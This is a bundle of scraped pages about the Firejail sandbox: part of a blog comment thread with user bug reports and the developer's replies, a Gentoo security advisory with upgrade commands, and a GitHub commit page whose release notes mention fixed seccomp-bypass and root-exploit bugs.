    Also, nautilus inside firejail cannot access my 1Terabyte usb disk. It says that I have not the right permissions. Did chown and got to access the disk but can’t see the files inside. Removing nautilus from /usr/local/bin solved the issue.

    Also, would like to request profiles for:

    mplayer2

    smplayer

    I am using a copied profile from gnome-mplayer but you guys can probably do a better job than me.

    Thanks.

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=880&_wpnonce=2725d0287c)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=880#respond) ↓
    1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[June 16, 2017 at 11:33 am](https://firejail.wordpress.com/download-2/release-notes/#comment-884)

       Try “firejail –noprofile simple-scan”. If this works, it means on or more lines in /etc/firejail/simple-scan.profile are creating the problem. Comment out the lines in that file one by one (add a #). Let me know if you find it.

       I’ll look into mplayer2 and smplayer.

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=884&_wpnonce=81d1570e35)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=884#respond) ↓
       1. ![](https://0.gravatar.com/avatar/355e73a37c72d9fa713c9a9ef4a2f0a81b24bab9577a73a1c8ba5315e7fa1b16?s=44&d=identicon&r=G)**GNUser** [June 16, 2017 at 9:22 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-887)

          I don’t have easy access to the printer/scanner (it’s in another room, don’t use it very often). But I will try and let you know if/when I can get a look into it.

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=887&_wpnonce=dbdc392ba1)Like
       3. ![](https://graph.facebook.com/v2.9/1996097984006278/picture?type=large&_md5=a499930431bef1836a6344f4cf44f02e)**[Dirk Salewski](https://www.facebook.com/app_scoped_user_id/1996097984006278/)** [August 3, 2017 at 6:37 am](https://firejail.wordpress.com/download-2/release-notes/#comment-1073)

          Hi netblue30,

          same “disappearing scanner”-problem here, and I think I found the offending line in /etc/firejail/simple-scan.profile. It’s “protocol unix,inet,inet6”.

          Since you are not able to reproduce this, I would guess that it’s something printer/manufacturer specific.

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=1073&_wpnonce=003013e8e1)Like
    3. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[June 17, 2017 at 12:01 am](https://firejail.wordpress.com/download-2/release-notes/#comment-888)

       Grab smplayer and mpayer2 profiles for here: <https://github.com/netblue30/firejail/tree/master/etc>

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=888&_wpnonce=c0cfc0ee38)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=888#respond) ↓
       1. ![](https://0.gravatar.com/avatar/355e73a37c72d9fa713c9a9ef4a2f0a81b24bab9577a73a1c8ba5315e7fa1b16?s=44&d=identicon&r=G)**GNUser** [June 18, 2017 at 12:33 am](https://firejail.wordpress.com/download-2/release-notes/#comment-894)

          Hey, thanks again.

          Still couldn’t look at the simple-scan issue.

          When I copy a profile into /etc/firejail/appname.profile, and run sudo firecfg, shouldn’t that new appname also be automatically firejailed when run from terminal? the curl profile is working ok, still gotta try it a little bit more, but I have to run “firejail curl” instead of it being automatically called. I suppose firecfg relies in it’s own list and not the profiles in the firejail folder??

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=894&_wpnonce=4e325bbe43)Like
       3. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[June 20, 2017 at 10:53 am](https://firejail.wordpress.com/download-2/release-notes/#comment-903)

          If you are not on the latest version (0.9.48), try to install it. There are all sort of fixes there.

          To start programs automatically, you also need to add a symbolic link to /usr/bin/firejail in /usr/local/bin directory. In the man page, look at “DESKTOP INTEGRATION” section.

          I still cannot reproduce your simple-scan problem. The best thing to do would be to put an issue on github (<https://github.com/netblue30/firejail>) maybe somebody comes up with an idea.

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=903&_wpnonce=fbadcd61fd)Like
21. ![](https://0.gravatar.com/avatar/355e73a37c72d9fa713c9a9ef4a2f0a81b24bab9577a73a1c8ba5315e7fa1b16?s=44&d=identicon&r=G)**GNUser** [June 15, 2017 at 12:17 am](https://firejail.wordpress.com/download-2/release-notes/#comment-881)

    Oh and another request:

    curl

    Seeing as it interacts with the internet it could really use a profile to make it more secure.

    Thanks

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=881&_wpnonce=abc5b19a1c)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=881#respond) ↓
    1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[June 16, 2017 at 11:30 am](https://firejail.wordpress.com/download-2/release-notes/#comment-883)

       I put a profile in git. Grab it from here: <https://github.com/netblue30/firejail/blob/master/etc/curl.profile>

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=883&_wpnonce=0436a8c21e)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=883#respond) ↓
       1. ![](https://0.gravatar.com/avatar/355e73a37c72d9fa713c9a9ef4a2f0a81b24bab9577a73a1c8ba5315e7fa1b16?s=44&d=identicon&r=G)**GNUser** [June 16, 2017 at 9:21 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-886)

          Thanks. Will try it and let you know how it goes for me.

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=886&_wpnonce=8d855e0c0c)Like
23. ![](https://2.gravatar.com/avatar/8d9d240238798359b170e8837fc3160b865e23d5ebfa03690eb5ce93546e60ab?s=44&d=identicon&r=G)**jairo** [June 18, 2017 at 9:00 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-896)

    Hola, he intentado iniciar Gimp en una sóla instancia pero no he podido, alguna sugerencia?

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=896&_wpnonce=d3e4c5442d)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=896#respond) ↓
25. ![](https://1.gravatar.com/avatar/4e499b2011e93497c975936f76474fa72e9643675c9d536d0b2128cf5ae2d4af?s=44&d=identicon&r=G)**fj-arch** [July 4, 2017 at 11:58 am](https://firejail.wordpress.com/download-2/release-notes/#comment-952)

    hello.

    i have been using firejail for a few months, without any problems. unfortunately, i just updated systemd on arch linux, and firejail can no longer resolve DNS, either with browser of from a simple firejail shell session.

    i just tried with the DNS argument `firejail –dns` but still no luck.

    running firefox or curl without a firejail container can definitely resolve DNS.

    is this an OK place to report bugs ? or is github better ?

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=952&_wpnonce=181c9ad3e8)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=952#respond) ↓
    1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[July 6, 2017 at 1:25 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-973)

       Put it on github. There are a number of Arch users there, maybe they run into the same problem.

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=973&_wpnonce=b03486fb09)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=973#respond) ↓
       1. ![](https://0.gravatar.com/avatar/ca6b480009ec6f75de0898af1719bcca3415f181534b9bb6886704cef9b10917?s=44&d=identicon&r=G)**arch-fj** [July 11, 2017 at 8:47 am](https://firejail.wordpress.com/download-2/release-notes/#comment-991)

          actually, a recent systemd update broke DNS for many.

          a simple:

          `mv /etc/nsswitch.conf.pacnew /etc/nsswitch.conf`

          fixed the issue. so definitely a distro specific problem.

          thanks for firejail!

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=991&_wpnonce=4d59dcf5d0)Like
27. ![](https://1.gravatar.com/avatar/7aa1f30b6ca72f330957fb2f6b237b0fd9fb2a5d891fd865fc41e37820b83e17?s=44&d=identicon&r=G)**Bob** [March 9, 2018 at 9:39 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-1985)

    Stumbled onto this app. Very impressed. keep up good work

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=1985&_wpnonce=b5eb80b1d8)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=1985#respond) ↓
    1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[March 19, 2018 at 6:41 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-2066)

       Thanks

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=2066&_wpnonce=9cff40988f)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=2066#respond) ↓
29. Pingback: [Episode 18 | This Week in Linux – TuxDigital](http://tuxdigital.com/2017/12/episode-18-this-week-in-linux/)
31. ![](https://1.gravatar.com/avatar/17a06101e6e8cfb51d2dff298c4829ab42f14609fbcaa6cb3b55ae04842f826d?s=44&d=identicon&r=G)**Josh** [July 10, 2018 at 10:09 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-2576)

    “Enable AppArmor by default for a large number of programs”

    Is this for Ubuntu only? Or does it work for Linux Mint as well?

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=2576&_wpnonce=21d46aacdf)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=2576#respond) ↓
    1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[July 14, 2018 at 11:22 am](https://firejail.wordpress.com/download-2/release-notes/#comment-2584)

       It is for any platform.

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=2584&_wpnonce=6eadf57ca1)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=2584#respond) ↓
       1. ![](https://1.gravatar.com/avatar/17a06101e6e8cfb51d2dff298c4829ab42f14609fbcaa6cb3b55ae04842f826d?s=44&d=identicon&r=G)**Josh** [July 15, 2018 at 2:58 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-2589)

          Thanks! Glad to see you consistently adding new features that help Linux as a whole.

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=2589&_wpnonce=35eb869347)Like
       3. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[July 22, 2018 at 10:50 am](https://firejail.wordpress.com/download-2/release-notes/#comment-2603)

          Thanks!

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=2603&_wpnonce=9170065b6f)Like
33. ![](https://2.gravatar.com/avatar/e5bc61e2453a7da6166f7177bfc3b4180d6cf39d78744761d9feccf6adc46557?s=44&d=identicon&r=G)**Percy** [September 11, 2018 at 2:36 am](https://firejail.wordpress.com/download-2/release-notes/#comment-2716)

    Hello. Long time Firejail user here. Love it and thank you so much for creating and improving it.

    I’ve been using it successfully with torbrowser until the latest #8 update. I tried the latest Firejail RC with no success. Torbrowser reports “your tab just crashed”. Won’t bring up a website at all.

    I’m using buntu 18.04. Torbrowser starts up all right but won’t go anywhere using Firejail.

    I’m not savvy enough to figure it out on my own. Thanks.

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=2716&_wpnonce=56e71e3cba)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=2716#respond) ↓
    1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[September 14, 2018 at 12:24 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-2724)

       Thanks for the report. We’ve been having some problems lately with tor browser – <https://github.com/netblue30/firejail/issues/2110>.

       We have a fixed on the master branch in github. There is some more testing coming, and the final release will be by the end of the month.

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=2724&_wpnonce=75a8821398)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=2724#respond) ↓
35. ![](https://0.gravatar.com/avatar/67704052d6d345fe26a363ccdb34eeb4a8a3678bca0adbb5b46f47fc86b9c42a?s=44&d=identicon&r=G)**Ray** [December 1, 2019 at 11:50 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-18697)

    Even on 0.9.56.2-LTS (within Firetools 0.9.58) with a fresh install of Linux Mint 19.2, I still can’t run Open Office inside Firejail. It always generates an error saying something like [context=”user” caught unexpected, Extension Manager: failed to read data entry in configuration backend

    Is anyone else still having this problem? Is there a compatibility issue if the drive is encrypted?

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=18697&_wpnonce=1afaaffee8)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=18697#respond) ↓
37. Pingback: [Firejail 0.9.62 duyuruldu | get GNU](http://www.getgnu.org/yazilim/firejail-0-9-62-duyuruldu.html)
39. ![](https://2.gravatar.com/avatar/8d9d240238798359b170e8837fc3160b865e23d5ebfa03690eb5ce93546e60ab?s=44&d=identicon&r=G)**Jairo** [August 19, 2020 at 3:04 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-19384)

    Hello, excellent work with firejail, I need your help for an experiment with something similar but using docker, everything works but I observe that the graphical applications that are created inside that container look different, specifically java swing and in chrome I observe tearing, I attach my experiment .<https://github.com/jgrateron/docker>

    Thank you.

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=19384&_wpnonce=784b41f2ac)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=19384#respond) ↓
41. Pingback: [Firejail 0.9.64 duyuruldu | get GNU](https://www.getgnu.org/yazilim/firejail-0-9-64-duyuruldu.html)
43. Pingback: [Vulnerability Summary for the Week of June 6, 2022 – TFun dot org](https://tfun.org/2022/06/13/sb22-164/)
45. Pingback: [Vulnerability Summary for the Week of June 6, 2022 – Totally Secure](https://totallysecure.net/?p=20877)
47. Pingback: [Vulnerabilidad en Firejail (Firejail Project) - CVE-2022-31214 - Información y Soluciones](https://vulnerability.app/2022/cve-2022-31214-firejail-firejail-project/)
49. Pingback: [Vulnerability Summary for the Week of June 6, 2022 – News](https://news.clearideas.net/?p=37)

### Leave a comment [Cancel reply](/download-2/release-notes/#respond)

Δ

Search for:

### Firejail Projects

[Firejail Security Sandbox](https://firejail.wordpress.com)

[Firetools, a Firejail GUI](http://firejailtools.wordpress.com)

[Firejail DoH Proxy Server](http://firejaildns.wordpress.com)
### Documentation

[Features](https://firejail.wordpress.com/features-3/)

[Usage](https://firejail.wordpress.com/documentation-2/basic-usage/)

[man firejail](https://firejail.wordpress.com/features-3/man-firejail/)

[All About Tor](https://firejail.wordpress.com/all-about-tor/)

[AppImage Support](https://firejail.wordpress.com/documentation-2/appimage-support/)

[BitTorrent Sandboxing Guide](https://firejaildns.wordpress.com/2020/03/21/firejail-bittorrent-sandboxing-guide/)

[Building Custom Profiles](https://firejail.wordpress.com/documentation-2/building-custom-profiles/)

[Firefox Sandboxing Guide](https://firejail.wordpress.com/documentation-2/firefox-guide/)

[Linux Capabilities Guide](https://firejail.wordpress.com/documentation-2/linux-capabilities-guide/)

[Linux Mint Sandboxing Guide](https://firejail.wordpress.com/2017/05/15/linux-mint-sandboxing-guide/)

[Sandboxing Binary Software](https://github.com/netblue30/firejail/wiki/Sandboxing-Binary-Software)

[Seccomp Guide](https://firejail.wordpress.com/documentation-2/seccomp-guide/)

[X11 Guide](https://firejail.wordpress.com/documentation-2/x11-guide/)

## Video HowTo's and Demos

[Introduction](https://odysee.com/%40netblue30%3A9/intro)

[Quick Start](https://odysee.com/%40netblue30%3A9/install)

[Firejail Encrypted DNS HowTo](https://odysee.com/%40netblue30%3A9/fdns)

[Firetools Demo](https://odysee.com/%40netblue30%3A9/firetools)

[Advanced Browser Security](https://odysee.com/%40netblue30%3A9/firefox)

[Advanced Tor Browser Security](https://odysee.com/%40netblue30%3A9/tor)

[AppImage HowTo](https://odysee.com/%40netblue30%3A9/appimage)

[Arch Linux HowTo](https://odysee.com/%40netblue30%3A9/archlinux)

[Building Security Profiles](https://odysee.com/%40netblue30%3A9/profiles)

[CyberGizmo Firejail Episode](https://odysee.com/%40netblue30%3A9/djware)

[Firefox Sandboxing Guide](https://odysee.com/%40netblue30%3A9/browser)

[Firejail Security Deep Dive](https://odysee.com/%40netblue30%3A9/divested)

[How to Build Your Own VPN](https://odysee.com/%40netblue30%3A9/sshvpn-final)

[La sécurité par l'isolation du bac à sable](https://odysee.com/%40netblue30%3A9/bacasable-720)

[Network Security Introduction](https://odysee.com/%40netblue30%3A9/networking)

[Phoenix LUG Firejail Presentation](https://odysee.com/%40netblue30%3A9/phoenix)

[Securing Bind 9 with AppArmor and Firejail](https://odysee.com/%40netblue30%3A9/bind)

### Categories

* [Firetools](https://firejail.wordpress.com/category/firetools/) (6)
* [How To](https://firejail.wordpress.com/category/how-to/) (45)
* [Linux Mint](https://firejail.wordpress.com/category/linux-mint/) (3)
* [Podcasts](https://firejail.wordpress.com/category/podcasts/) (1)
* [Poll](https://firejail.wordpress.com/category/poll/) (1)
* [Review](https://firejail.wordpress.com/category/review/) (11)
* [Technology](https://firejail.wordpress.com/category/technology/) (8)
* [Video](https://firejail.wordpress.com/category/video/) (13)
### Recent Posts: Firejail

#### [How To Build Your Own VPN](https://firejail.wordpress.com/2022/11/08/how-to-build-your-own-vpn/)

#### [How to Restrict Internet Access to a Single Program on Arch Linux with Firejail](https://firejail.wordpress.com/2022/03/23/how-to-restrict-internet-access-to-a-single-program-on-arch-linux-with-firejail/)

#### [How to Sandbox Non-trusted Apps in Linux Systems](https://firejail.wordpress.com/2022/02/06/how-to-sandbox-non-trusted-apps-in-linux-systems/)

#### [Jailing the Zoom Client](https://firejail.wordpress.com/2021/11/25/jailing-the-zoom-client/)

#### [Advanced Browser Security with Firejail – A Hands On Guide](https://firejail.wordpress.com/2021/11/11/advanced-browser-security-with-firejail-a-hands-on-guide/)

#### [Restricting Programs From Backdoors/IP Leaks (Audacity Example)](https://firejail.wordpress.com/2021/10/31/restricting-programs-from-backdoors-ip-leaks-audacity-example/)

#### [Securing Bind 9 with AppArmor and Firejail](https://firejail.wordpress.com/2021/10/26/securing-bind-9-with-apparmor-and-firejail/)

#### [How To Disable Network Access (video)](https://firejail.wordpress.com/2021/10/19/how-to-disable-network-access/)

#### [Sandboxing Linux with Firejail (video)](https://firejail.wordpress.com/2021/10/08/3420/)

#### [Building Firejail Security Profiles (video)](https://firejail.wordpress.com/2021/06/30/building-firejail-security-profiles-video/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Firejail](https://firejail.wordpress.com)

  Join 99 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffirejail.wordpress.com%2Fdownload-2%2Frelease-notes%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Firejail](https://firejail.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffirejail.wordpress.com%2Fdownload-2%2Frelease-notes%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/P72tqY-2A)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://firejail.wordpress.com/download-2/release-notes/)
  + [View post in Reader](https://wordpress.com/read/blogs/104024156/posts/160)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from security.gentoo.org_6c734e9d_20250124_234013.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Firejail: Multiple vulnerabilities — GLSA **201701-62**

Multiple vulnerabilities have been discovered in Firejail, the
worst of which may allow privilege escalation.

### Affected packages

| Package | **sys-apps/firejail** on all architectures |
| --- | --- |
| Affected versions | < **0.9.44.4** |
| Unaffected versions | >= **0.9.44.4** |

| Package | **sys-apps/firejail-lts** on all architectures |
| --- | --- |
| Affected versions | < **0.9.38.8** |
| Unaffected versions | >= **0.9.38.8** |

### Background

A SUID program that reduces the risk of security breaches by restricting
the running environment of untrusted applications using Linux namespaces
and seccomp-bpf.

### Description

Multiple vulnerabilities have been discovered in Firejail. Please review
the CVE identifiers referenced below for details.

### Impact

An attacker could possibly bypass sandbox protection, cause a Denial of
Service condition, or escalate privileges.

### Workaround

There is no known workaround at this time.

### Resolution

All Firejail users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-apps/firejail-0.9.44.4"

```

All Firejail-lts users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-apps/firejail-lts-0.9.38.8"

```
### References

* [CVE-2017-5180](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-5180)
* [CVE-2017-5206](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-5206)
* [CVE-2017-5207](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-5207)

**Release date**

January 24, 2017

**Latest revision**

January 31, 2017: 2

**Severity**

normal

**Exploitable**

local, remote

**Bugzilla entries**

* [604758](https://bugs.gentoo.org/show_bug.cgi?id=604758)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from github.com_cbf22e14_20250126_043202.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnetblue30%2Ffirejail%2Fcommit%2F6b8dba29d73257311564ee7f27b9b14758cc693e)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnetblue30%2Ffirejail%2Fcommit%2F6b8dba29d73257311564ee7f27b9b14758cc693e)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=netblue30%2Ffirejail)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[netblue30](/netblue30)
/
**[firejail](/netblue30/firejail)**
Public

* [Notifications](/login?return_to=%2Fnetblue30%2Ffirejail) You must be signed in to change notification settings
* [Fork
  584](/login?return_to=%2Fnetblue30%2Ffirejail)
* [Star
   5.9k](/login?return_to=%2Fnetblue30%2Ffirejail)

* [Code](/netblue30/firejail)
* [Issues
  440](/netblue30/firejail/issues)
* [Pull requests
  20](/netblue30/firejail/pulls)
* [Discussions](/netblue30/firejail/discussions)
* [Actions](/netblue30/firejail/actions)
* [Projects
  7](/netblue30/firejail/projects)
* [Wiki](/netblue30/firejail/wiki)
* [Security](/netblue30/firejail/security)
* [Insights](/netblue30/firejail/pulse)

Additional navigation options

* [Code](/netblue30/firejail)
* [Issues](/netblue30/firejail/issues)
* [Pull requests](/netblue30/firejail/pulls)
* [Discussions](/netblue30/firejail/discussions)
* [Actions](/netblue30/firejail/actions)
* [Projects](/netblue30/firejail/projects)
* [Wiki](/netblue30/firejail/wiki)
* [Security](/netblue30/firejail/security)
* [Insights](/netblue30/firejail/pulse)

## Commit

[Permalink](/netblue30/firejail/commit/6b8dba29d73257311564ee7f27b9b14758cc693e)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

security fix

[Browse files](/netblue30/firejail/tree/6b8dba29d73257311564ee7f27b9b14758cc693e)
Browse the repository at this point in the history

* Loading branch information

netblue30
committed
Jan 6, 2017

1 parent
[d37421f](/netblue30/firejail/commit/d37421f8b1cc0f8c6f40523169f02447eaba9405)

commit 6b8dba2

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**25 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* RELNOTES
  [RELNOTES](#diff-fd09eca26377770282a565d7fb67f97411d240994b0265e4051d28303540a4cf)
* src

  + firejail

    - src/firejail/main.c
      [main.c](#diff-6698244f9a67e5c8ae5c03806df74f6d9f1ae1b31ad6176eb09e136f07f3dad9)
  + man

    - src/man/firejail.txt
      [firejail.txt](#diff-97f7f95889f9d4cdd046fd44b8a0d4b0325d79ef80365ecd6c938dbcf729dc64)

## There are no files selected for viewing

3 changes: 3 additions & 0 deletions

3
[RELNOTES](#diff-fd09eca26377770282a565d7fb67f97411d240994b0265e4051d28303540a4cf "RELNOTES")

Show comments

[View file](/netblue30/firejail/blob/6b8dba29d73257311564ee7f27b9b14758cc693e/RELNOTES)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,5 +1,8 @@ |
|  |  | firejail (0.9.44.3) baseline; urgency=low |
|  |  | \* development version |
|  |  | \* security: disabled --allow-debuggers when running on kernel |
|  |  | versions prior to 4.8; a kernel bug in ptrace system call |
|  |  | allows a full bypass of seccomp filter; problem reported by Lizzie Dixon |
|  |  | \* security: root exploit found by Sebastian Krahmer |
|  |  | -- netblue30 <netblue30@yahoo.com> Wed, 4 Jan 2017 11:00:00 -0500 |
|  |  |  |
